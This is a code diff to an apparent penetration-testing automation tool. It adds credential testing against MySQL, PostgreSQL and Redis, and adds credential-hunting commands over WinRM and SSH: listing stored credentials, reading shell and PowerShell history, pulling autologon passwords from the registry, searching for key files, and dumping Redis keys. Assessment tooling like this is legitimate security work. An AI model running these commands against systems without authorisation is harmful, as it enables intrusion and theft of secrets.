@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import json
+import os
 import re
 import subprocess
 from pathlib import Path
@@ -1147,11 +1148,16 @@ def _creds_winrm(
         findings.add_summary(f"WinRM access: `{user}` on port {port}")
         print(f"        [+] {user}: WinRM:{port} valid")
         win_cmds = [
-            ("whoami /all",                                                                                      f"creds_winrm_whoami_all_{user}"),
-            ("net localgroup administrators",                                                                    f"creds_winrm_localadmins_{user}"),
-            ('net group "Domain Admins" /domain',                                                               f"creds_winrm_domainadmins_{user}"),
-            ("ipconfig /all",                                                                                    f"creds_winrm_ipconfig_{user}"),
-            ('$env:COMPUTERNAME; [System.Environment]::OSVersion.VersionString; (Get-WmiObject Win32_ComputerSystem).DomainRole', f"creds_winrm_sysinfo_{user}"),
+            ("whoami /all",                                                                                                                                                                              f"creds_winrm_whoami_all_{user}"),
+            ("net localgroup administrators",                                                                                                                                                            f"creds_winrm_localadmins_{user}"),
+            ('net group "Domain Admins" /domain',                                                                                                                                                       f"creds_winrm_domainadmins_{user}"),
+            ("ipconfig /all",                                                                                                                                                                            f"creds_winrm_ipconfig_{user}"),
+            ('$env:COMPUTERNAME; [System.Environment]::OSVersion.VersionString; (Get-WmiObject Win32_ComputerSystem).DomainRole',                                                                       f"creds_winrm_sysinfo_{user}"),
+            # Credential hunting quick wins
+            ("cmdkey /list",                                                                                                                                                                             f"creds_winrm_cmdkey_{user}"),
+            ("net use 2>&1",                                                                                                                                                                             f"creds_winrm_netuse_{user}"),
+            ('Get-Content "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" -ErrorAction SilentlyContinue | Select-Object -Last 30',                                  f"creds_winrm_history_{user}"),
+            ('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 2>&1 | Select-String -Pattern "Password|DefaultUser"',                                                        f"creds_winrm_autologon_{user}"),
         ]
         for win_cmd, label in win_cmds:
             cmd2 = ["nxc", "winrm", ip, "-u", user, "-p", pw, "-X", win_cmd]
@@ -1177,11 +1183,16 @@ def _creds_ssh(
         "-p", str(port),
         f"{user}@{ip}",
         (
-            "whoami; id; hostname; uname -a 2>/dev/null; "
+            "echo '=== identity ==='; whoami; id; hostname; uname -a 2>/dev/null; "
             "cat /etc/os-release 2>/dev/null | head -3; "
-            "sudo -l 2>/dev/null; "
-            "cat /etc/passwd | grep -v nologin | grep -v false | grep -v sync 2>/dev/null; "
-            "ss -tlnp 2>/dev/null | head -20 || netstat -tlnp 2>/dev/null | head -20"
+            "echo '=== sudo ==='; sudo -l 2>/dev/null; "
+            "echo '=== users ==='; cat /etc/passwd | grep -v nologin | grep -v false | grep -v sync 2>/dev/null; "
+            "echo '=== network ==='; ss -tlnp 2>/dev/null | head -20 || netstat -tlnp 2>/dev/null | head -20; "
+            "echo '=== suid ==='; find / -perm -4000 -type f 2>/dev/null | grep -v snap | head -20; "
+            "echo '=== cron ==='; cat /etc/crontab 2>/dev/null; ls /etc/cron.d/ 2>/dev/null; "
+            "echo '=== history ==='; cat ~/.bash_history 2>/dev/null | tail -20; cat ~/.zsh_history 2>/dev/null | tail -20; "
+            "echo '=== home ==='; ls -la /home/ 2>/dev/null; "
+            "echo '=== interesting files ==='; find /home /var/www /opt /tmp -name '*.txt' -o -name '*.conf' -o -name '*.bak' -o -name '*.key' 2>/dev/null | grep -v proc | head -20"
         ),
     ]
     findings.cmd(f"sshpass -p *** ssh -p {port} {user}@{ip} 'whoami; hostname; id'")
@@ -1269,6 +1280,99 @@ def _creds_rdp(
         print(f"        [-] {user}: RDP:{port} invalid")
 
 
+def _creds_mysql(
+    ip: str, port: int, user: str, pw: str,
+    runner: Runner, findings: ServiceBuffer, ws: Workspace,
+) -> None:
+    findings.h4(f"MySQL — {user}")
+    try:
+        result = subprocess.run(
+            ["mysql", "-u", user, f"-p{pw}", "-h", ip, "--port", str(port),
+             "--connect-timeout", "8", "-e", "SHOW DATABASES; SELECT user, host FROM mysql.user;"],
+            capture_output=True, text=True, timeout=15,
+        )
+    except (subprocess.TimeoutExpired, FileNotFoundError):
+        findings.note("mysql client not available or timed out")
+        print(f"        [-] MySQL: client unavailable")
+        return
+
+    if result.returncode == 0 and result.stdout.strip():
+        ws.add_valid_cred(user, pw, f"MySQL:{port}")
+        findings.add_summary(f"MySQL access: `{user}` on port {port}")
+        findings.bullet("**MySQL login successful**")
+        findings.code_block(_trim(result.stdout))
+        print(f"        [+] {user}: MySQL:{port} valid")
+    else:
+        err = result.stderr.strip().splitlines()[0] if result.stderr.strip() else "auth failed"
+        findings.note(f"MySQL `{user}`: {err}")
+        print(f"        [-] {user}: MySQL:{port} invalid")
+
+
+def _creds_postgres(
+    ip: str, port: int, user: str, pw: str,
+    runner: Runner, findings: ServiceBuffer, ws: Workspace,
+) -> None:
+    findings.h4(f"PostgreSQL — {user}")
+    env = os.environ.copy()
+    env["PGPASSWORD"] = pw
+    try:
+        result = subprocess.run(
+            ["psql", "-h", ip, "-p", str(port), "-U", user,
+             "-c", "\\l", "-c", "SELECT current_user, pg_postmaster_start_time();",
+             "--no-password", "-w"],
+            capture_output=True, text=True, timeout=15, env=env,
+        )
+    except (subprocess.TimeoutExpired, FileNotFoundError):
+        findings.note("psql not available or timed out")
+        print(f"        [-] PostgreSQL: client unavailable")
+        return
+
+    if result.returncode == 0 and result.stdout.strip():
+        ws.add_valid_cred(user, pw, f"PostgreSQL:{port}")
+        findings.add_summary(f"PostgreSQL access: `{user}` on port {port}")
+        findings.bullet("**PostgreSQL login successful**")
+        findings.code_block(_trim(result.stdout))
+        print(f"        [+] {user}: PostgreSQL:{port} valid")
+    else:
+        err = result.stderr.strip().splitlines()[0] if result.stderr.strip() else "auth failed"
+        findings.note(f"PostgreSQL `{user}`: {err}")
+        print(f"        [-] {user}: PostgreSQL:{port} invalid")
+
+
+def _creds_redis(
+    ip: str, port: int, pw: str,
+    runner: Runner, findings: ServiceBuffer, ws: Workspace,
+) -> None:
+    findings.h4(f"Redis (auth)")
+    try:
+        result = subprocess.run(
+            ["redis-cli", "-h", ip, "-p", str(port), "-a", pw, "--no-auth-warning",
+             "info", "server"],
+            capture_output=True, text=True, timeout=15,
+        )
+    except (subprocess.TimeoutExpired, FileNotFoundError):
+        findings.note("redis-cli not available or timed out")
+        print(f"        [-] Redis: client unavailable")
+        return
+
+    if result.returncode == 0 and "redis_version" in result.stdout.lower():
+        ws.add_valid_cred("redis", pw, f"Redis:{port}")
+        findings.add_summary(f"Redis authenticated access on port {port}")
+        findings.bullet("**Redis auth accepted**")
+        findings.code_block(_trim(result.stdout, 20))
+        print(f"        [+] Redis:{port} auth valid")
+        # Bonus: dump all keys
+        keys_result = subprocess.run(
+            ["redis-cli", "-h", ip, "-p", str(port), "-a", pw, "--no-auth-warning", "keys", "*"],
+            capture_output=True, text=True, timeout=10,
+        )
+        if keys_result.stdout.strip():
+            findings.bullet(f"Keys: {', '.join(keys_result.stdout.strip().splitlines()[:20])}")
+    else:
+        findings.note(f"Redis auth failed on port {port}")
+        print(f"        [-] Redis:{port} auth invalid")
+
+
 # ── Per-service dispatcher ────────────────────────────────────────────────────
 
 _SERVICE_HANDLERS: dict[int, str] = {
@@ -1277,9 +1381,12 @@ _SERVICE_HANDLERS: dict[int, str] = {
     139:  "smb",
     445:  "smb",
     1433: "mssql",
+    3306: "mysql",
     3389: "rdp",
+    5432: "postgres",
     5985: "winrm",
     5986: "winrm",
+    6379: "redis",
 }
 
 _NAME_HANDLERS: dict[str, str] = {
@@ -1288,8 +1395,11 @@ _NAME_HANDLERS: dict[str, str] = {
     "microsoft-ds": "smb",
     "netbios":      "smb",
     "ms-sql":       "mssql",
+    "mysql":        "mysql",
     "rdp":          "rdp",
+    "postgresql":   "postgres",
     "winrm":        "winrm",
+    "redis":        "redis",
 }
 
 
@@ -1340,6 +1450,15 @@ def _enumerate_services(
                 _creds_mssql(ip, svc.port, domain, user, pw, runner, buf, ws, available)
             elif kind == "rdp":
                 _creds_rdp(ip, svc.port, domain, user, pw, runner, buf, ws, available)
+            elif kind == "mysql":
+                _creds_mysql(ip, svc.port, user, pw, runner, buf, ws)
+            elif kind == "postgres":
+                _creds_postgres(ip, svc.port, user, pw, runner, buf, ws)
+
+        # Redis uses a single password (not user:pass) — test all found passwords
+        if kind == "redis":
+            for _, pw in creds:
+                _creds_redis(ip, svc.port, pw, runner, buf, ws)
 
         findings.flush_service_buffer(buf)
 
